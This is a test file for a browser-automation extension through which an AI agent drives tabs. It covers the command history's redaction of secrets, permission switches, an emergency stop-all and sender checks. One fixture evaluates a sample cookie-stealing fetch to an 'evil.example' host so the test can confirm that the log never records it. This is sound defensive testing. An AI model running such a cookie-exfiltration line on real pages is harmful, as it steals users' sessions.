// Popup <-> background contract of the REAL extension/background.js: the
// mcp-status running list and agent tabs, the history host + allow-listed
// detail (never typed text, values or code), agent-disabled tracking
// (mcpAgentDisabled) and the privileged mcp-stop-all emergency stop (which
// also releases tab audio recordings and gives agent tabs native dialogs).

import { afterEach, describe, expect, test } from "bun:test";
import { EXT_ID, ExtHarness, rejectionOf, sleep, waitFor } from "../helpers/ext-harness.js";

const T = 20_000;

let h: ExtHarness | null = null;
afterEach(async () => {
  await h?.close();
  h = null;
});

/** A page_wait on a selector that never appears: runs until cancelled (or 20 s). */
function slowWait(x: ExtHarness, tabId?: number): Promise<unknown> {
  const p = x.server.send("page_wait", { selector: "#never", timeoutMs: 20_000 }, tabId, 30_000);
  p.catch(() => {});
  return p;
}

const sorted = (a: unknown) => (Array.isArray(a) ? a.slice().sort() : a);

/** Sends a runtime message as some other sender; resolves whether any listener answered or kept the channel open. */
function sendAs(x: ExtHarness, msg: Record<string, unknown>, sender: Record<string, unknown>): { kept: boolean; answered: () => boolean } {
  let answered = false;
  const ret = x.chrome.events.runtimeMessage.emit(msg, sender, () => {
    answered = true;
  });
  return { kept: ret.includes(true), answered: () => answered };
}

describe("mcp-status", () => {
  test("running lists the commands in flight, newest first, with their host", async () => {
    h = await ExtHarness.create({ html: "<p>static page</p>" });
    const idle = await h.popup({ type: "mcp-status" });
    expect(idle.running).toEqual([]);
    expect(idle.activeTab).toMatchObject({ id: 1, url: "https://example.com/" });

    const first = slowWait(h, 1);
    await waitFor(() => h!.chrome.content.filter((c) => c.cmd === "page_wait").length === 1, "the first page_wait to run");
    const second = slowWait(h); // no tabId: the active tab
    await waitFor(() => h!.chrome.content.filter((c) => c.cmd === "page_wait").length === 2, "the second page_wait to run");
    const [a, b] = h.inbound((f) => f.action === "page_wait");

    const st = await h.popup({ type: "mcp-status" });
    expect(st.running).toHaveLength(2);
    expect(st.running[0]).toEqual({ id: String(b.id), action: "page_wait", tabId: null, host: "example.com", startedAt: expect.any(Number) });
    expect(st.running[1]).toEqual({ id: String(a.id), action: "page_wait", tabId: 1, host: "example.com", startedAt: expect.any(Number) });
    expect(st.running[0].startedAt).toBeGreaterThanOrEqual(st.running[1].startedAt);
    expect(Math.abs(Date.now() - st.running[1].startedAt)).toBeLessThan(10_000);
    // Existing fields stay.
    expect(st).toMatchObject({ bridgeConnected: true, paired: true, activeTab: { id: 1 } });

    // Finished commands leave the list.
    const stop = await h.popup({ type: "mcp-stop-all" });
    expect(stop.cancelled).toBe(2);
    expect((await rejectionOf(first)).message).toContain("cancelled");
    expect((await rejectionOf(second)).message).toContain("cancelled");
    await waitFor(() => h!.bg.state.runningCmds.size === 0, "the commands to end");
    expect((await h.popup({ type: "mcp-status" })).running).toEqual([]);
  }, T);

  test("agentTabs lists the tabs the agent created or targeted, never the fallback tab", async () => {
    h = await ExtHarness.create({ html: "<p>user page</p>" });
    expect((await h.popup({ type: "mcp-status" })).agentTabs).toEqual([]);

    // A command without tabId makes tab 1 a fallback tab only.
    await h.server.send("page_text", {});
    await waitFor(() => h!.bg.state.fallbackTabs.has(1), "tab 1 to become a fallback tab");
    expect((await h.popup({ type: "mcp-status" })).agentTabs).toEqual([]);

    const created = await h.server.send<{ id: number }>("tab_create", { url: "https://docs.example.org/guide/intro?session=abc#top" });
    expect(created.id).toBe(2);
    await waitFor(() => h!.bg.state.agentTabs.has(2), "the new tab to become an agent tab");
    const st = await h.popup({ type: "mcp-status" });
    expect(st.agentTabs).toEqual([{ id: 2, windowId: 1, title: "", host: "docs.example.org", active: true }]);

    // The history entry of tab_create: the target's hostname only.
    const hist = (await h.popup({ type: "mcp-history-get" })).history;
    expect(hist[0]).toMatchObject({ action: "tab_create", ok: true, host: "docs.example.org", detail: "docs.example.org" });
    expect(JSON.stringify(hist)).not.toContain("session=abc");
    expect(JSON.stringify(hist)).not.toContain("/guide");

    // A tab that is gone (chrome.tabs.get fails) is skipped; long titles are capped.
    h.chrome.tabs.get(2)!.title = "T".repeat(500);
    expect((await h.popup({ type: "mcp-status" })).agentTabs[0].title).toHaveLength(120);
    h.chrome.tabs.delete(2);
    expect((await h.popup({ type: "mcp-status" })).agentTabs).toEqual([]);
  }, T);
});

describe("command history", () => {
  test("host and an allow-listed detail; never typed text, values, code or URL paths", async () => {
    h = await ExtHarness.create({ html: '<input id="login-pass"><input id="login-user">' });
    const SECRET = "hunter2-S3cr3t-T0ken!";
    const CODE = `fetch("https://evil.example/steal?k=" + document.cookie + "${SECRET}")`;

    await h.server.send("dom_type", { selector: "#login-pass", text: SECRET }, 1);
    await h.server.send("dom_fill", { fields: { "#login-user": SECRET } }, 1);
    await h.server.send("dom_fill", { fields: { "#login-user": SECRET, "#login-pass": SECRET } }, 1);
    await h.server.send("js_evaluate", { expression: CODE }, 1);
    await h.server.send("tab_navigate", { url: "https://accounts.example.net/reset/password?token=${SECRET}#frag" }, 1);
    await h.server.send("keyboard_press", { key: "Enter" }, 1);
    await h.server.send("keyboard_press", { key: "x" }, 1);
    await h.server.send("cdp_send", { method: "Page.getLayoutMetrics", params: { note: SECRET } }, 1);
    await h.server.send("cookies_get", { url: "https://shop.example.com/cart?sid=${SECRET}", name: "sid" });
    await h.server.send("dom_click", { selector: "#login-user" }); // no tabId: the active tab's host
    await h.server.send("tabs_list", {});

    const history: any[] = (await h.popup({ type: "mcp-history-get" })).history;
    const byAction = (a: string) => history.filter((e) => e.action === a);
    expect(history.every((e) => typeof e.host === "string" && typeof e.detail === "string" && e.detail.length <= 120)).toBe(true);

    expect(byAction("dom_type")[0]).toMatchObject({ ok: true, host: "example.com", detail: `#login-pass · ${SECRET.length} chars`, tabId: 1 });
    const fills = byAction("dom_fill");
    expect(fills[1].detail).toBe(`#login-user · ${SECRET.length} chars`);
    expect(fills[0].detail).toBe("#login-user, #login-pass · 2 fields");
    expect(byAction("js_evaluate")[0].detail).toBe(`${CODE.length} chars of code`);
    // The tab's own host; the detail is the target's hostname only.
    expect(byAction("tab_navigate")[0]).toMatchObject({ host: "example.com", detail: "accounts.example.net" });
    expect(byAction("keyboard_press").map((e) => e.detail)).toEqual(["1 key", "Enter"]);
    expect(byAction("cdp_send")[0].detail).toBe("Page.getLayoutMetrics");
    expect(byAction("cookies_get")[0]).toMatchObject({ host: "", detail: "shop.example.com" });
    expect(byAction("dom_click")[0]).toMatchObject({ host: "example.com", detail: "#login-user", tabId: null });
    expect(byAction("tabs_list")[0]).toMatchObject({ host: "", detail: "" });

    const all = JSON.stringify(history);
    for (const leak of [SECRET, "hunter2", "fetch(", "document.cookie", "evil.example", "/reset", "token=", "sid=", "/cart", "#frag", "params"]) {
      expect(all).not.toContain(leak);
    }
  }, T);
});

describe("agent-disabled tracking", () => {
  test("perm_set over the bridge marks agentDisabled; a popup change clears the mark", async () => {
    h = await ExtHarness.create();
    // The user switched dom_hover off first: it never counts as the agent's.
    await h.popup({ type: "mcp-perms-set", action: "dom_hover", enabled: false });
    expect((await h.popup({ type: "mcp-perms-get" })).agentDisabled).toEqual([]);

    await h.server.send("perm_set", { action: "dom_click", enabled: false });
    await h.server.send("perm_set", { action: "dom_hover", enabled: false });
    await h.server.send("perm_set", { action: "tab_audio_capture", enabled: false }); // alias of two actions
    const expected = ["dom_click", "tab_audio_record_start", "tab_audio_record_stop"];
    const got = await h.popup({ type: "mcp-perms-get" });
    expect(sorted(got.agentDisabled)).toEqual(expected);
    expect(got.disabled).toEqual(expect.arrayContaining(["dom_hover", ...expected]));
    await waitFor(() => JSON.stringify(sorted(h!.store.local.mcpAgentDisabled)) === JSON.stringify(expected), "mcpAgentDisabled to be stored");

    // A foreign write to the key is overwritten by the in-memory set.
    await h.chrome.api.storage.local.set({ mcpAgentDisabled: ["js_evaluate", "dom_hover"] });
    await waitFor(() => JSON.stringify(sorted(h!.store.local.mcpAgentDisabled)) === JSON.stringify(expected), "the foreign write to be reverted");
    expect(sorted((await h.popup({ type: "mcp-perms-get" })).agentDisabled)).toEqual(expected);

    // The user re-enables dom_click: no longer off, no longer marked.
    const on = await h.popup({ type: "mcp-perms-set", action: "dom_click", enabled: true });
    expect(on.disabled).not.toContain("dom_click");
    expect(sorted(on.agentDisabled)).toEqual(["tab_audio_record_start", "tab_audio_record_stop"]);
    expect(await h.server.send("perm_list", {})).toMatchObject({ disabled: expect.not.arrayContaining(["dom_click"]) });

    // A delta naming an action (even to keep it off) makes it the user's choice.
    await h.popup({ type: "mcp-perms-set", actions: { tab_audio_record_start: false } });
    const after = await h.popup({ type: "mcp-perms-get" });
    expect(after.agentDisabled).toEqual(["tab_audio_record_stop"]);
    expect(after.disabled).toContain("tab_audio_record_start");
    await waitFor(() => JSON.stringify(h!.store.local.mcpAgentDisabled) === JSON.stringify(["tab_audio_record_stop"]), "the new set to be stored");

    // Survives a service-worker restart; stale or unknown stored names are dropped on load.
    h.store.local.mcpAgentDisabled = ["tab_audio_record_stop", "dom_click", "no_such_action"];
    h.restartWorker();
    await h.waitPaired();
    expect((await h.popup({ type: "mcp-perms-get" })).agentDisabled).toEqual(["tab_audio_record_stop"]);
  }, T);
});

describe("mcp-stop-all", () => {
  test("switches everything off, clears the agent marks and cancels running commands", async () => {
    h = await ExtHarness.create({ html: "<p>static page</p>" });
    await h.server.send("perm_set", { action: "dom_click", enabled: false });
    await h.server.send("emulation_viewport", { width: 500, height: 600 }, 1);
    const all: string[] = (await h.popup({ type: "mcp-perms-get" })).cats.flatMap((c: { actions: string[] }) => c.actions);

    const running = slowWait(h, 1);
    await waitFor(() => h!.chrome.content.some((c) => c.cmd === "page_wait"), "page_wait to run");
    const cmd = h.inbound((f) => f.action === "page_wait")[0];

    const res = await h.popup({ type: "mcp-stop-all" });
    expect(res.ok).toBe(true);
    expect(res.cancelled).toBe(1);
    expect(sorted(res.disabled)).toEqual(all.slice().sort());

    expect((await rejectionOf(running)).message).toContain("cancelled");
    await waitFor(() => h!.bg.state.commandHistory[0]?.id === cmd.id, "the command to end");
    expect(h.bg.state.commandHistory[0]).toMatchObject({ action: "page_wait", ok: false, error: "cancelled", host: "example.com" });
    expect(h.outbound((f) => f.id === cmd.id)).toEqual([{ id: cmd.id, ok: false, error: "cancelled" }]);
    expect(h.bg.state.runningCmds.size).toBe(0);

    const perms = await h.popup({ type: "mcp-perms-get" });
    expect(perms.disabled).toHaveLength(all.length);
    expect(perms.agentDisabled).toEqual([]);
    await waitFor(() => (h!.store.local.mcpDisabled as string[] | undefined)?.length === all.length, "mcpDisabled to be stored");
    expect(h.store.local.mcpAgentDisabled).toEqual([]);
    await waitFor(() => h!.server.knownDisabled()?.length === all.length, "the perms event to reach the server");
    // Debugger-backed sessions are torn down as for any switch turned off.
    await waitFor(() => !h!.bg.state.viewportSessions.has(1), "the viewport session teardown");

    // Nothing new passes the gate; nothing left to cancel.
    expect((await rejectionOf(h.server.send("page_text", {}, 1))).message).toContain("Permission disabled in extension: page_text");
    expect((await h.popup({ type: "mcp-stop-all" })).cancelled).toBe(0);
  }, T);

  /** A fake offscreen document: tab audio recordings by tab id. */
  function fakeOffscreen(x: ExtHarness) {
    const recs = new Map<number, { state: string; retrieved: boolean }>();
    const released: number[] = [];
    let holdStart: Promise<void> | null = null;
    x.chrome.api.offscreen = { hasDocument: async () => true, createDocument: async () => {} };
    x.chrome.api.tabCapture = { getMediaStreamId: async () => "stream-1" };
    x.chrome.runtimeHandler = async (msg) => {
      switch (msg?.type) {
        case "mcp-offscreen-audio-start":
          if (holdStart) await holdStart;
          recs.set(msg.tabId, { state: "recording", retrieved: false });
          return { ok: true, startedAt: Date.now(), mimeType: "audio/webm" };
        case "mcp-offscreen-audio-list":
          return {
            ok: true,
            tabIds: [...recs].filter(([, r]) => r.state === "recording" || !r.retrieved).map(([id]) => id),
            recordings: [...recs].map(([tabId, r]) => ({ tabId, ...r })),
          };
        case "mcp-offscreen-audio-stop": {
          const r = recs.get(msg.tabId);
          if (!r) return { ok: false, error: `No audio recording found for tab ${msg.tabId}.` };
          r.state = "finished";
          r.retrieved = true;
          return { ok: true, base64: "AAAA", mimeType: "audio/webm", durationMs: 50, sizeBytes: 3 };
        }
        case "mcp-offscreen-audio-release":
          released.push(msg.tabId);
          return { ok: true, released: recs.delete(msg.tabId) };
        default:
          return undefined;
      }
    };
    return {
      recs,
      released,
      hold(p: Promise<void> | null) {
        holdStart = p;
      },
    };
  }
  const offscreenTypes = (x: ExtHarness) => x.chrome.runtimeMessages.map((m: any) => m?.type);

  test("releases every tab audio recording: re-enabling cannot hand the agent audio captured after the stop", async () => {
    h = await ExtHarness.create({ html: "<p>static page</p>" });
    const off = fakeOffscreen(h);
    expect(await h.server.send("tab_audio_record_start", {}, 1)).toMatchObject({ ok: true, tabId: 1, recording: true });
    // Tab 7: stopped and handed out, but its data is still kept (not released yet).
    off.recs.set(7, { state: "finished", retrieved: true });

    expect(await h.popup({ type: "mcp-stop-all" })).toMatchObject({ ok: true, cancelled: 0 });
    await waitFor(() => off.recs.size === 0, "the recordings to be released");
    expect(off.released.slice().sort()).toEqual([1, 7]);

    // The user switches recording back on: nothing is left to hand out.
    await h.popup({ type: "mcp-perms-set", actions: { tab_audio_record_start: true, tab_audio_record_stop: true } });
    expect((await rejectionOf(h.server.send("tab_audio_record_stop", {}, 1))).message).toContain("No audio recording found for tab 1");
    expect((await rejectionOf(h.server.send("tab_audio_record_stop", {}))).message).toContain("No active tab audio recording");

    // A single switch does the same; unrelated switches leave recordings alone.
    expect(await h.server.send("tab_audio_record_start", {}, 1)).toMatchObject({ ok: true, recording: true });
    const before = h.chrome.runtimeMessages.length;
    await h.popup({ type: "mcp-perms-set", action: "dom_click", enabled: false });
    await sleep(50);
    expect(h.chrome.runtimeMessages.length).toBe(before);
    expect(off.recs.has(1)).toBe(true);
    await h.popup({ type: "mcp-perms-set", action: "tab_audio_record_stop", enabled: false });
    await waitFor(() => off.recs.size === 0, "the recording to be released");
    expect(offscreenTypes(h).slice(before)).toEqual(["mcp-offscreen-audio-list", "mcp-offscreen-audio-release"]);
  }, T);

  test("a recording that was starting when its switch went off is discarded, not left running", async () => {
    h = await ExtHarness.create({ html: "<p>static page</p>" });
    const off = fakeOffscreen(h);
    let go!: () => void;
    off.hold(new Promise<void>((r) => (go = r)));
    const start = h.server.send("tab_audio_record_start", {}, 1);
    start.catch(() => {});
    await waitFor(() => offscreenTypes(h!).includes("mcp-offscreen-audio-start"), "the start to reach the offscreen document");

    // The discard runs before the recording exists: it finds nothing.
    await h.popup({ type: "mcp-perms-set", action: "tab_audio_record_start", enabled: false });
    await waitFor(() => offscreenTypes(h!).includes("mcp-offscreen-audio-list"), "the discard to list the recordings");
    expect(off.released).toEqual([]);

    go();
    expect((await rejectionOf(start)).message).toContain("switched off in the extension while it started");
    expect(off.recs.size).toBe(0);
    expect(off.released).toEqual([1]);
  }, T);

  test("agent tabs get native dialogs back, also after a navigation, until dialog_policy is on again", async () => {
    h = await ExtHarness.create({ html: "<p>static page</p>" });
    const hooks = () => h!.chrome.scripts.filter((s) => s.func === "mcpDialogHookMain" && s.tabId === 1).map((s) => (s.args as any[])[0]);
    const agentPolicy = { passthrough: false, accept: true, promptText: "agent-text", blockUnload: false };
    await h.server.send("dialog_policy", { accept: true, promptText: "agent-text" });
    await h.server.send("page_text", {}, 1); // explicit tabId: an agent tab
    await waitFor(() => hooks().length > 0, "the dialog hook");
    expect(hooks().at(-1)).toEqual(agentPolicy);

    let n = hooks().length;
    await h.popup({ type: "mcp-stop-all" });
    await waitFor(() => hooks().length > n, "the hook refresh after the stop");
    expect(hooks().slice(n).every((p) => p.passthrough === true)).toBe(true);

    // A navigation re-installs the hook: still native dialogs.
    n = hooks().length;
    h.chrome.navigate(1, "https://example.com/next");
    await waitFor(() => hooks().length > n, "the hook install after the navigation");
    await sleep(50);
    expect(hooks().slice(n).every((p) => p.passthrough === true)).toBe(true);

    // Other switches back on: dialogs stay native.
    n = hooks().length;
    await h.popup({ type: "mcp-perms-set", actions: { page_text: true, dialog_get: true } });
    await waitFor(() => hooks().length > n, "the hook refresh");
    expect(hooks().slice(n).every((p) => p.passthrough === true)).toBe(true);

    // dialog_policy back on: the agent's policy applies again.
    n = hooks().length;
    await h.popup({ type: "mcp-perms-set", action: "dialog_policy", enabled: true });
    await waitFor(() => hooks().length > n, "the hook refresh");
    expect(hooks().at(-1)).toEqual(agentPolicy);
  }, T);

  test("is ignored from a content script, a web page or another extension", async () => {
    h = await ExtHarness.create({ html: "<p>static page</p>" });
    const running = slowWait(h, 1);
    await waitFor(() => h!.chrome.content.some((c) => c.cmd === "page_wait"), "page_wait to run");

    const senders: Array<Record<string, unknown>> = [
      // Our own content script (a tab sender).
      { id: EXT_ID, tab: { id: 1, url: "https://example.com/" }, frameId: 0, url: "https://example.com/", origin: "https://example.com" },
      // No tab but not an extension page URL.
      { id: EXT_ID, url: "https://example.com/" },
      // Another extension's page.
      { id: "zyxwvutsrqponmlkzyxwvutsrqponmlk", url: "chrome-extension://zyxwvutsrqponmlkzyxwvutsrqponmlk/popup.html" },
      // No sender id at all.
      { url: `chrome-extension://${EXT_ID}/popup.html` },
    ];
    for (const sender of senders) {
      for (const type of ["mcp-stop-all", "mcp-status", "mcp-perms-get"]) {
        const r = sendAs(h, { type }, sender);
        expect(r.kept).toBe(false);
        await sleep(20);
        expect(r.answered()).toBe(false);
      }
    }
    await sleep(100);
    expect(h.bg.state.runningCmds.size).toBe(1);
    expect(h.bg.state.disabledActions.size).toBe(0);
    expect(h.store.local.mcpDisabled).toBeUndefined();

    // The popup itself can.
    expect(await h.popup({ type: "mcp-stop-all" })).toMatchObject({ ok: true, cancelled: 1 });
    expect((await rejectionOf(running)).message).toContain("cancelled");
  }, T);
});
